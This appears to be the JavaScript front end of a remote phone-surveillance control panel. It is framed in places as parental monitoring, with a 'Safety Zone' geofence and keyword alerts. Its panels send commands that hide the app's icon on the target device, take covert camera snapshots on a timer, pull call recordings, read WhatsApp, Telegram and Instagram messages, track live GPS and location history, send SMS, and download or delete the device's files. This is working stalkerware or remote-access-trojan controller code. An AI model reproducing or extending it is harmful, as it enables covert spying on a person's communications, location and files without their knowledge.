// ==================== UI RENDERING MODULE ====================
function showNotification(text) {
    const orig = statusEl.innerText;
    statusEl.innerText = text;
    setTimeout(() => { statusEl.innerText = orig; }, 2000);
}

function getFormattedDateTime() {
    const d = new Date();
    const pad = (n) => n.toString().padStart(2, '0');
    return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
}

function pushAlert(title, body) {
    newAlerts.unshift({ title: title, body: body, time: new Date().toLocaleTimeString() });
    if (newAlerts.length > 50) newAlerts.pop();
    const badge = document.getElementById('alertsBadge');
    const list = document.getElementById('alertsList');
    if (!badge || !list) return;
    badge.style.display = 'block';
    list.innerHTML = '';
    newAlerts.forEach(function(a) {
        const d = document.createElement('div');
        d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';
        d.textContent = a.time + ' ' + a.title + ': ' + a.body;
        list.appendChild(d);
    });
}

function clearAlerts() {
    newAlerts.length = 0;
    const badge = document.getElementById('alertsBadge');
    if (badge) badge.style.display = 'none';
}

function toggleCameraPanel(panelId) {
    const clickPanel = document.getElementById('clickCameraPanel');
    const livePanel = document.getElementById('liveCameraPanel');
    if (panelId === 'click') {
        clickPanel.classList.toggle('show');
        livePanel.classList.remove('show');
    } else {
        livePanel.classList.toggle('show');
        clickPanel.classList.remove('show');
    }
}

function capturePicture() {
    const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
    const useFlash = document.getElementById('clickFlashCheckbox').checked;
    sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash });
}

function displayCapturedImage(base64) {
    panel.innerHTML = `
        <img src="data:image/jpeg;base64,${base64}" style="max-width:100%; border-radius:8px;">
        <div style="margin-top:10px;">
            <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')" style="padding:8px 16px; background:#1976ff; color:#fff; border:none; border-radius:6px; cursor:pointer;">💾 SAVE IMAGE</button>
        </div>
    `;
}

function showAudio(base64) {
    panel.innerHTML = `
        <audio controls src="data:audio/3gp;base64,${base64}" style="width:100%;"></audio>
        <button onclick="downloadBase64('${base64}', 'recording.3gp')" style="margin-top:10px; padding:8px 16px; background:#1976ff; color:#fff; border:none; border-radius:6px;">💾 Download</button>
    `;
}

function downloadBase64(b64, filename) {
    const a = document.createElement('a');
    a.href = 'data:application/octet-stream;base64,' + b64;
    a.download = filename;
    a.click();
}

function formatBytes(b) {
    if (b === 0) return '0 B';
    const k = 1024, sizes = ['B','KB','MB','GB'];
    const i = Math.floor(Math.log(b)/Math.log(k));
    return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
}

function gotoPage(p) {
    currentPage = p;
    renderTable();
}

function navigateUp() {
    if (currentPath === 'root' || currentPath === '') return;
    let parts = currentPath.split('/');
    parts.pop();
    let parent = parts.join('/');
    if (parent === '') parent = 'root';
    currentPath = parent;
    sendCommand('LIST_FILES', { path: parent });
}

function updateSelected(checkbox) {
    const path = checkbox.dataset.path;
    if (checkbox.checked) {
        if (!selectedFiles.includes(path)) selectedFiles.push(path);
    } else {
        selectedFiles = selectedFiles.filter(p => p !== path);
    }
    updateCounters();
}

function updateCounters() {
    const count = selectedFiles.length;
    const downloadCountSpan = document.getElementById('downloadCount');
    const deleteCountSpan = document.getElementById('deleteCount');
    if (downloadCountSpan) downloadCountSpan.innerText = count;
    if (deleteCountSpan) deleteCountSpan.innerText = count;
}

function downloadSelected() {
    if (selectedFiles.length === 0) {
        alert('No files selected');
        return;
    }
    selectedFiles.forEach(path => {
        sendPlainText('dl ' + path);
    });
}

function deleteSelected() {
    if (selectedFiles.length === 0) {
        alert('No files selected');
        return;
    }

    const confirmMsg = `Delete ${selectedFiles.length} file(s)? This action cannot be undone.`;
    if (!confirm(confirmMsg)) return;

    selectedFiles.forEach(path => {
        sendCommand('DELETE_FILE', { path: path });
    });

    selectedFiles = [];
    updateCounters();
}

function handleFolderClick(path) {
    currentPath = path;
    sendCommand('LIST_FILES', { path: path });
}

function toggleAppIcon() {
    if (iconHidden) sendCommand('SHOW_APP');
    else sendCommand('HIDE_APP');
}

function toggleFlash() {
    if (flashOn) {
        sendCommand('FLASH_OFF');
    } else {
        sendCommand('FLASH_ON');
    }
}

function toggleLiveGps() {
    const btn = document.getElementById('liveGpsBtn');
    if (!liveGpsActive) {
        sendCommand('START_GPS_UPDATES');
        liveGpsActive = true;
        if (btn) {
            btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
            btn.style.background = '#d32f2f';
            btn.style.color = '#fff';
        }
        showNotification('Live GPS started');
    } else {
        sendCommand('STOP_GPS_UPDATES');
        liveGpsActive = false;
        if (btn) {
            btn.querySelector('span:last-child').textContent = 'Live GPS Track';
            btn.style.cssText = '';
        }
        showNotification('GPS stopped');
    }
}

function showSendSmsPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '✉️ Send SMS';
    const form = document.createElement('div');
    form.style.cssText = 'display:flex;flex-direction:column;gap:12px;max-width:400px;margin-top:12px';

    function makeField(labelText, id, tagName, extra) {
        const wrap = document.createElement('div');
        const lbl = document.createElement('label');
        lbl.style.cssText = 'font-size:12px;color:#999;display:block;margin-bottom:4px';
        lbl.textContent = labelText;
        const inp = document.createElement(tagName);
        inp.id = id;
        inp.style.cssText = 'width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;box-sizing:border-box';
        if (extra) Object.assign(inp, extra);
        wrap.appendChild(lbl);
        wrap.appendChild(inp);
        return wrap;
    }
    form.appendChild(makeField('Phone Number', 'smsNumber', 'input', { type: 'tel', placeholder: '+91 99999 00000' }));
    form.appendChild(makeField('Message', 'smsBody', 'textarea', { rows: 4, placeholder: 'Type message…' }));

    const sendBtn = document.createElement('button');
    sendBtn.textContent = '📤 Send';
    sendBtn.style.cssText = 'padding:10px 20px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px';
    sendBtn.addEventListener('click', doSendSms);
    form.appendChild(sendBtn);
    panel.appendChild(h3);
    panel.appendChild(form);
}

function doSendSms() {
    const number = document.getElementById('smsNumber').value.trim();
    const body = document.getElementById('smsBody').value.trim();
    if (!number || !body) {
        showNotification('Enter number and message');
        return;
    }
    sendCommand('SEND_SMS', { number: number, body: body });
}

function showSchedulePanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '⏱️ Auto Screenshot';
    const card = document.createElement('div');
    card.style.cssText = 'display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;background:#f9f9f9;border-radius:10px;padding:16px';

    const wrap1 = document.createElement('div');
    const l1 = document.createElement('label');
    l1.style.cssText = 'font-size:12px;color:#999';
    l1.textContent = 'Interval (minutes)';
    const inp1 = document.createElement('input');
    inp1.id = 'schedInterval';
    inp1.type = 'number';
    inp1.value = '5';
    inp1.min = '1';
    inp1.style.cssText = 'display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:90px;margin-top:4px';
    wrap1.appendChild(l1);
    wrap1.appendChild(inp1);

    const wrap2 = document.createElement('div');
    const l2 = document.createElement('label');
    l2.style.cssText = 'font-size:12px;color:#999';
    l2.textContent = 'Camera';
    const sel = document.createElement('select');
    sel.id = 'schedCam';
    sel.style.cssText = 'display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;margin-top:4px';
    [['Rear', '0'], ['Front', '1']].forEach(function(opt) {
        const o = document.createElement('option');
        o.value = opt[1];
        o.textContent = opt[0];
        sel.appendChild(o);
    });
    wrap2.appendChild(l2);
    wrap2.appendChild(sel);

    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:8px';
    const startBtn = document.createElement('button');
    startBtn.textContent = '▶ Start';
    startBtn.style.cssText = 'padding:8px 16px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer';
    startBtn.addEventListener('click', startScheduledCapture);
    const stopBtn = document.createElement('button');
    stopBtn.textContent = '■ Stop';
    stopBtn.style.cssText = 'padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer';
    stopBtn.addEventListener('click', function() { sendCommand('STOP_SCHEDULED_CAPTURE'); });
    btnRow.appendChild(startBtn);
    btnRow.appendChild(stopBtn);

    card.appendChild(wrap1);
    card.appendChild(wrap2);
    card.appendChild(btnRow);
    const note = document.createElement('p');
    note.style.cssText = 'color:#999;font-size:12px;margin-top:10px';
    note.textContent = 'Images appear in the camera section when captured.';
    panel.appendChild(h3);
    panel.appendChild(card);
    panel.appendChild(note);
}

function startScheduledCapture() {
    const mins = parseInt(document.getElementById('schedInterval').value) || 5;
    const cam = parseInt(document.getElementById('schedCam').value);
    sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes: mins, cameraId: cam });
    showNotification('Auto-capture every ' + mins + ' min');
}

function showAppUsagePanel() {
    panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device</p>';
    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap';
    [['Today', 1], ['7 Days', 7], ['30 Days', 30]].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
        b.addEventListener('click', function() { sendCommand('GET_APP_USAGE', { days: item[1] }); });
        btnRow.appendChild(b);
    });
    panel.appendChild(btnRow);
}

function showGeofencePanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '🗺️ Geofence — Safety Zone';
    const desc = document.createElement('p');
    desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:12px';
    desc.textContent = 'Click the map to set the safe zone centre.';
    const mapDiv = document.createElement('div');
    mapDiv.id = 'geofenceMap';
    mapDiv.style.cssText = 'width:100%;height:300px;border-radius:10px;margin-bottom:12px';

    const controls = document.createElement('div');
    controls.style.cssText = 'display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end';

    function makeInput(labelText, id, type, placeholder, width, value) {
        const wrap = document.createElement('div');
        const lbl = document.createElement('label');
        lbl.style.cssText = 'font-size:12px;color:#999';
        lbl.textContent = labelText;
        const inp = document.createElement('input');
        inp.id = id;
        inp.type = type;
        inp.placeholder = placeholder || '';
        inp.style.cssText = 'display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:' + width;
        if (value !== undefined) inp.value = value;
        wrap.appendChild(lbl);
        wrap.appendChild(inp);
        return wrap;
    }

    controls.appendChild(makeInput('Latitude', 'gfLat', 'number', 'e.g. 20.2961', '130px'));
    controls.appendChild(makeInput('Longitude', 'gfLon', 'number', 'e.g. 85.8245', '130px'));
    controls.appendChild(makeInput('Radius (m)', 'gfRadius', 'number', '', '90px', '500'));

    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:8px';
    [['Set Fence', '#4caf50', function() { setGeofence(); }],
     ['Clear', '#d32f2f', function() { sendCommand('CLEAR_GEOFENCE'); }],
     ['Status', '#1976ff', function() { sendCommand('GET_GEOFENCE'); }]
    ].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:8px 16px;background:' + item[1] + ';color:#fff;border:none;border-radius:8px;cursor:pointer';
        b.addEventListener('click', item[2]);
        btnRow.appendChild(b);
    });
    controls.appendChild(btnRow);

    panel.appendChild(h3);
    panel.appendChild(desc);
    panel.appendChild(mapDiv);
    panel.appendChild(controls);

    setTimeout(function() {
        try {
            const gm = L.map('geofenceMap').setView([20.5937, 78.9629], 5);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(gm);
            let mk, ci;
            gm.on('click', function(ev) {
                document.getElementById('gfLat').value = ev.latlng.lat.toFixed(6);
                document.getElementById('gfLon').value = ev.latlng.lng.toFixed(6);
                if (mk) gm.removeLayer(mk);
                if (ci) gm.removeLayer(ci);
                mk = L.marker([ev.latlng.lat, ev.latlng.lng]).addTo(gm);
                const r = parseFloat(document.getElementById('gfRadius').value) || 500;
                ci = L.circle([ev.latlng.lat, ev.latlng.lng], { radius: r, color: '#1976ff', fillOpacity: 0.15 }).addTo(gm);
            });
        } catch(err) { console.warn('Leaflet:', err); }
    }, 100);
}

function setGeofence() {
    const lat = parseFloat(document.getElementById('gfLat').value);
    const lon = parseFloat(document.getElementById('gfLon').value);
    const radius = parseFloat(document.getElementById('gfRadius').value) || 500;
    if (isNaN(lat) || isNaN(lon)) {
        showNotification('Enter valid coordinates');
        return;
    }
    sendCommand('SET_GEOFENCE', { lat: lat, lon: lon, radius: radius });
}

function useLocationAsGeofence(lat, lon) {
    sendCommand('SET_GEOFENCE', { lat: lat, lon: lon, radius: 500 });
    showNotification('Geofence set at ' + lat.toFixed(4) + ', ' + lon.toFixed(4));
}

function showLocationHistoryPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '📍 Location History';
    panel.appendChild(h3);
    const note = document.createElement('p');
    note.style.cssText = 'color:#666;font-size:12px;margin-bottom:10px';
    note.textContent = 'GPS fixes logged automatically.';
    panel.appendChild(note);
    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap';
    [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
        b.addEventListener('click', function() {
            sendCommand('GET_LOCATION_HISTORY', {days: item[1]});
        });
        btnRow.appendChild(b);
    });
    panel.appendChild(btnRow);
    const mapDiv = document.createElement('div');
    mapDiv.id = 'historyMap';
    mapDiv.style.cssText = 'width:100%;height:320px;border-radius:10px;margin-bottom:12px';
    panel.appendChild(mapDiv);
    const listDiv = document.createElement('div');
    listDiv.id = 'historyList';
    panel.appendChild(listDiv);
    sendCommand('GET_LOCATION_HISTORY', {days:3});
    setTimeout(function() {
        try {
            window._historyMap = L.map('historyMap').setView([20.5937, 78.9629], 5);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap);
        } catch(e) { console.warn('Map init:', e); }
    }, 100);
}

function showCallRecordingsPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '🎙️ Call Recordings';
    panel.appendChild(h3);
    const note = document.createElement('p');
    note.style.cssText = 'color:#ff9800;font-size:12px;margin-bottom:12px;background:#fff3e0;border-radius:6px;padding:8px';
    note.textContent = '⚠️ On some devices, only microphone audio may be captured.';
    panel.appendChild(note);
    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
    [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
        b.addEventListener('click', function() {
            sendCommand('GET_CALL_RECORDINGS', {days: item[1]});
        });
        btnRow.appendChild(b);
    });
    panel.appendChild(btnRow);
    const listDiv = document.createElement('div');
    listDiv.id = 'callRecList';
    listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
    panel.appendChild(listDiv);
    sendCommand('GET_CALL_RECORDINGS', {days:5});
}

function showPhotoGalleryPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '🖼️ Photo Gallery';
    panel.appendChild(h3);
    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
    [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
        b.addEventListener('click', function() {
            sendCommand('GET_RECENT_IMAGES', {days: item[1]});
        });
        btnRow.appendChild(b);
    });
    panel.appendChild(btnRow);
    const grid = document.createElement('div');
    grid.id = 'photoGrid';
    grid.style.cssText = 'display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px';
    grid.innerHTML = '<p style="color:#999;padding:20px">Loading...</p>';
    panel.appendChild(grid);
    sendCommand('GET_RECENT_IMAGES', {days:5});
}

function showAppEventsPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '📦 App & Call Events';
    panel.appendChild(h3);
    const note = document.createElement('p');
    note.style.cssText = 'color:#666;font-size:12px;margin-bottom:12px';
    note.textContent = 'App installs/removals and call events.';
    panel.appendChild(note);
    const btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
    [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
        b.addEventListener('click', function() {
            sendCommand('GET_APP_EVENTS', {days: item[1]});
        });
        btnRow.appendChild(b);
    });
    panel.appendChild(btnRow);
    const listDiv = document.createElement('div');
    listDiv.id = 'appEventsList';
    listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
    panel.appendChild(listDiv);
    sendCommand('GET_APP_EVENTS', {days:5});
}

function showSmsKeywordsPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '🔑 SMS Keyword Alerts';
    panel.appendChild(h3);
    const desc = document.createElement('p');
    desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:14px';
    desc.textContent = 'Get instant alerts when an incoming SMS contains any of these words.';
    panel.appendChild(desc);
    const inputRow = document.createElement('div');
    inputRow.style.cssText = 'display:flex;gap:8px;margin-bottom:14px';
    const inp = document.createElement('input');
    inp.id = 'kwInput';
    inp.type = 'text';
    inp.placeholder = 'e.g. drug, fight, bully (comma separated)';
    inp.style.cssText = 'flex:1;padding:9px 12px;border:1px solid #ddd;border-radius:8px;font-size:13px';
    const saveBtn = document.createElement('button');
    saveBtn.textContent = '💾 Save';
    saveBtn.style.cssText = 'padding:9px 18px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:600';
    saveBtn.addEventListener('click', function() {
        const raw = document.getElementById('kwInput').value.trim();
        if (!raw) {
            showNotification('Enter at least one keyword');
            return;
        }
        const kws = raw.split(',').map(function(k) { return k.trim(); }).filter(function(k) { return k.length > 0; });
        sendCommand('SET_SMS_KEYWORDS', {keywords: kws});
    });
    inputRow.appendChild(inp);
    inputRow.appendChild(saveBtn);
    panel.appendChild(inputRow);
    const ctrlRow = document.createElement('div');
    ctrlRow.style.cssText = 'display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap';
    [['📋 View Current','GET_SMS_KEYWORDS',null,'#1976ff'],
     ['🗑️ Clear All','CLEAR_SMS_KEYWORDS',null,'#d32f2f'],
     ['⚠️ View Alerts','GET_SMS_ALERTS',{days:5},'#ff9800']
    ].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:8px 14px;background:'+item[3]+';color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px';
        b.addEventListener('click', function() { sendCommand(item[1], item[2] || {}); });
        ctrlRow.appendChild(b);
    });
    panel.appendChild(ctrlRow);
    const resultDiv = document.createElement('div');
    resultDiv.id = 'kwResult';
    panel.appendChild(resultDiv);
}

function showSocialMessagesPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '💬 Social Messages';
    panel.appendChild(h3);
    const filterRow = document.createElement('div');
    filterRow.style.cssText = 'display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px';
    [['All','ALL'],['WhatsApp','com.whatsapp'],['Telegram','org.telegram.messenger'],
     ['Instagram','com.instagram.android']].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:4px 12px;background:#e3f2fd;color:#1976ff;border:1px solid #bbdefb;border-radius:12px;cursor:pointer;font-size:12px';
        b.addEventListener('click', function() { filterSocialByPkg(item[1]); });
        filterRow.appendChild(b);
    });
    const dayRow = document.createElement('div');
    dayRow.style.cssText = 'display:flex;gap:8px;margin-bottom:12px';
    [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
        const b = document.createElement('button');
        b.textContent = item[0];
        b.style.cssText = 'padding:6px 14px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px';
        b.addEventListener('click', function() {
            sendCommand('GET_SOCIAL_MESSAGES', {days: item[1]});
        });
        dayRow.appendChild(b);
    });
    const note = document.createElement('p');
    note.style.cssText = 'color:#999;font-size:12px;margin-bottom:8px';
    note.textContent = 'Captures WhatsApp, Telegram, Instagram and other notifications.';
    const list = document.createElement('div');
    list.id = 'socialMsgList';
    panel.appendChild(filterRow);
    panel.appendChild(dayRow);
    panel.appendChild(note);
    panel.appendChild(list);
    sendCommand('GET_SOCIAL_MESSAGES', {days:1});
}

function showFirebaseSettingsPanel() {
    panel.innerHTML = '';
    const h3 = document.createElement('h3');
    h3.textContent = '🔥 Firebase Configuration';
    panel.appendChild(h3);
    const desc = document.createElement('p');
    desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:16px;line-height:1.6';
    desc.innerHTML = 'Enter your Firebase project config.';
    panel.appendChild(desc);
    const fbConf = CONFIG.FIREBASE_CONFIG;
    const fields = [
        ['apiKey','API Key'],['authDomain','Auth Domain'],['projectId','Project ID'],
        ['storageBucket','Storage Bucket'],['messagingSenderId','Sender ID'],['appId','App ID']
    ];
    const form = document.createElement('div');
    form.style.cssText = 'display:flex;flex-direction:column;gap:10px;max-width:480px';
    fields.forEach(function(f) {
        const wrap = document.createElement('div');
        const lbl = document.createElement('label');
        lbl.style.cssText = 'font-size:12px;color:#999;display:block;margin-bottom:3px';
        lbl.textContent = f[1];
        const inp = document.createElement('input');
        inp.id = 'fb_'+f[0];
        inp.type = 'text';
        inp.value = (fbConf[f[0]] && fbConf[f[0]] !== 'YOUR_API_KEY') ? fbConf[f[0]] : '';
        inp.placeholder = f[1];
        inp.style.cssText = 'width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:6px;font-size:13px;box-sizing:border-box';
        wrap.appendChild(lbl);
        wrap.appendChild(inp);
        form.appendChild(wrap);
    });
    const saveBtn = document.createElement('button');
    saveBtn.textContent = '💾 Save & Connect';
    saveBtn.style.cssText = 'padding:10px 20px;background:#ff6f00;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin-top:6px';
    saveBtn.addEventListener('click', function() {
        const newCfg = {};
        fields.forEach(function(f) { newCfg[f[0]] = document.getElementById('fb_'+f[0]).value.trim(); });
        if (!newCfg.projectId) {
            alert('Enter at least Project ID');
            return;
        }
        localStorage.setItem('fbConfig', JSON.stringify(newCfg));
        alert('Saved! Reload page to apply Firebase config.');
    });
    panel.appendChild(form);
    panel.appendChild(saveBtn);
    const connected = fbConf.apiKey && fbConf.apiKey !== 'YOUR_API_KEY';
    const status = document.createElement('div');
    status.style.cssText = 'margin-top:16px;padding:12px;background:#f5f5f5;border-radius:8px;font-size:12px';
    status.innerHTML = connected
        ? '<span style="color:#4caf50;font-weight:700">● Firebase Connected</span> — ' + (fbConf.projectId || '')
        : '<span style="color:#d32f2f;font-weight:700">● Not configured</span> — Enter credentials above';
    panel.appendChild(status);
}
